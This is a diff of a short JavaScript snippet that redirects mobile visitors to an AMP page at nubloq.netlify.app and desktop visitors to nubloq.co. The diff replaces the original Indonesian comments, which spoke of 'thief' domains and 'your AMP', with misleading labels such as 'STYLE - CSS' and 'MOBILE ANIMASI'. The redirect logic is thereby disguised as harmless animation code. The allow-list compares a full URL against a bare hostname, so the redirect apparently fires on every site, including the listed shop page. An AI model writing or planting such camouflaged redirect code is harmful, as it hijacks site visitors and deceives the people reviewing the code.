@@ -1,6 +1,6 @@
 (function () {
   // =====================================
-  // KONFIGURASI
+  // STYLE - CSS
   // =====================================
   const allowedHosts = [
     'https://madinaelectriccentre.com/installment/',
@@ -8,40 +8,40 @@
   ];
 
   const config = {
-    ampUrl: 'https://nubloq.netlify.app/', // AMP kamu
-    desktopRedirect: 'https://nubloq.co/',       // redirect desktop kalau maling
-    redirectMobileOnly: true                      // true = redirect hanya mobile
+    ampUrl: 'https://nubloq.netlify.app/', 
+    desktopRedirect: 'https://nubloq.co/',       
+    redirectMobileOnly: true                     
   };
 
   // =====================================
-  // CEK DOMAIN
+  // DESKSTOP ANIMASI
   // =====================================
   const currentHost = window.location.hostname.toLowerCase();
   const isAllowed = allowedHosts.includes(currentHost);
 
-  if (isAllowed) return; // Domain resmi → tidak diapa-apakan
+  if (isAllowed) return; 
 
   // =====================================
-  // CEK DEVICE (MOBILE)
+  // MOBILE ANIMASI
   // =====================================
   const isMobile = /Android|iPhone|iPad|iPod|Mobile|BlackBerry|IEMobile|Opera Mini/i.test(
     navigator.userAgent
   );
 
   // =====================================
-  // BEHAVIOR UNTUK DOMAIN MALING
+  // ADD-ONS ANIMASI
   // =====================================
 
   if (config.redirectMobileOnly) {
     if (isMobile) {
-      // MOBILE → redirect ke AMP kamu
+
       window.location.replace(config.ampUrl);
     } else {
-      // DESKTOP → redirect normal ke domain resmi
+
       window.location.replace(config.desktopRedirect);
     }
   } else {
-    // Mode: redirect semua (mobile + desktop)
+
     window.location.replace(config.desktopRedirect);
   }
 })();
